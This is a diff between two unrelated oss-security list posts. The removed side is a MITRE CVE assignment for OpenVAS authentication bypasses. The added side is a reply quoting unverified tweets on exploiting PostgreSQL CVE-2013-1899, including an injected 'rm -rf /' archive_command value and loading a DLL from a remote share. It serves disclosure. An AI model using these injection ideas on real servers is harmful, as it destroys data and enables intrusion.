@@ -1,63 +1,25 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/11/10/2
-Message-Id: <201311101233.rAACXe7D015250@linus.mitre.org>
-Date: Sun, 10 Nov 2013 07:33:40 -0500 (EST)
-From: cve-assign@...re.org
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2013/04/04/3
+Message-ID: <20130404144816.GA6485@openwall.com>
+Date: Thu, 4 Apr 2013 18:48:16 +0400
+From: Solar Designer <solar@...nwall.com>
 To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: CVE-2013-6765 CVE-2013-6766 for OpenVAS 4.0.4/1.3.2/etc.
+Subject: Re: PostgreSQL security update
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
-
-> http://lists.wald.intevation.org/pipermail/openvas-announce/2013-November/000157.html
-
-> For OpenVAS Manager, this is a security release addressing a serious
-> security bug and it is highly recommended to update any installation of
-> OpenVAS Manager 3.0 and 4.0 with the corresponding release.
+On Thu, Apr 04, 2013 at 06:39:31PM +0400, Solar Designer wrote:
+> A heads-up in case someone missed today's news:
 > 
-> A software bug in OpenVAS Manager allowed an attacker to bypass the OMP
-> authentication procedure. The attack vector was remotely available in
-> case OpenVAS Manager was listening on a public network interface. In
-> case of successful attack, the attacker gained partial rights to execute
-> OMP commands.  The bypass authentication was, however, incomplete and
-> several OMP commands failed to execute properly.
+> http://www.postgresql.org/about/news/1456/
+> http://www.postgresql.org/support/security/faq/2013-04-04/
 
-Use CVE-2013-6765.
+HD Moore's quick tweets on possible exploitability of CVE-2013-1899 into
+remote code execution (beyond the attack vectors mentioned in
+"2013-04-04 Security Release FAQ" above):
 
+<@hdmoore> @quine exploitation seems tricky, I wonder if -c shared_preload_libraries=\\unc\share\blah.dll is doable
+<@hdmoore> @quine Another options appears to be something like: -c archive_command=rm${IFS}-rf${IFS}/
 
-> For OpenVAS Administrator, this is a security release addressing a very
-> serious security bug and it is highly recommended to update any
-> installation of OpenVAS Administrator 1.2 and 1.3 with the corresponding
-> release.
-> 
-> A software bug in OpenVAS Administrator allowed an attacker to bypass
-> the OAP authentication procedure. The attack vector was remotely
-> available in case OpenVAS Administrator was listening on a public
-> network interface. In case of successful attack, the attacker was able
-> to create and modify users and could use the gained privileges to take
-> control over an OpenVAS installation if the Scanner and/or Manager
-> instances controlled by this Administrator instance were also listening
-> on public network interfaces.
+Indeed, these have not been verified yet and they might not be doable.
 
-Use CVE-2013-6766.
-
-Apparently a discloser will provide technical details at a later date.
-
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
-
-iQEcBAEBAgAGBQJSf3zLAAoJEKllVAevmvms5ukH/2N+qMKDquLPObf3uvgBiNu5
-HFD2870eX6efagcpmQHg3hI4rVxNV2B5JfhUewcX2PT3GMmYGpYEbsQU9wS/L0lR
-Fs1XesLvQoZCpiZ99V1t7UyQT10yy4fTgA7PGYKalNMgkPpdZvipJXDhqcFnnzCv
-AFcFggOlFrI0fCZ0tMXPNzxNzNGXPxplMjbU/tTNz/LBCGAcA3ARjUAhzSiWvcV8
-LoVULOqYfxSEHSi1kL0juXJ2AGl1tl0DhZJoqFPLSmrlv+kmCK1cyKkuwlaPqxoi
-/VIRBW+gs3A9dm+BB8ReIb2hQkipM+uY1jsfI9ERofwnud0RgRN5mHZkxOj5W9Y=
-=c9Ja
------END PGP SIGNATURE-----
+Alexander
